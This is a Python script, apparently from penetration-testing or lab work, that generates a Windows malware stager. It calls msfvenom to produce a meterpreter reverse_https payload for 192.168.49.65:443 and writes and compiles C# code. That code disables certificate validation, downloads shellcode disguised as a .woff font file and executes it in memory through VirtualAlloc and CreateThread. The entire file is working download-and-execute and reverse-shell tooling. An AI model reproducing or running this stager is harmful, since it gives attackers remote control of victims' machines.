#!/bin/env python3
import os
import subprocess

LHOST = "192.168.49.65"
LPORT = 443
BASE_FILENAME = 'win_msf_sliver_stager'
MSFVENOM_CMD = f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={LHOST} LPORT={LPORT} -f raw -e generic/none"
STAGER_URL = "http://192.168.49.65/stager.woff"

def get_shellcode(msfvenom_cmd):
  shellcode = subprocess.check_output(msfvenom_cmd, shell=True)

  return shellcode

def generate(stager_url):

  template = """
using System;
using System.Net;
using System.Runtime.InteropServices;

namespace SliverStager
{{
    public class Stager
    {{
        private static string url = "{stager_url}";

        public static void Main()
        {{
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);

            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            IntPtr pinfo = IntPtr.Zero;
            // execute native code
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }}

        private static UInt32 MEM_COMMIT = 0x3000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId
        );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
          IntPtr hHandle,
          UInt32 dwMilliseconds
        );
    }}
}}
  """.format(stager_url=stager_url)

  print(template)
  f = open(BASE_FILENAME + ".cs", "w")
  f.write(template)
  f.close()

  print("Wrote " + BASE_FILENAME + ".cs")


def compile():
  cmd = f"mcs {BASE_FILENAME}.cs"
  os.system(cmd)

def main():
  shellcode = get_shellcode(MSFVENOM_CMD)
  generate(STAGER_URL)
  compile() 
    
  f = open(BASE_FILENAME + '.raw', 'wb')
  f.write(shellcode)
  f.close()


if __name__ == "__main__":
  main()
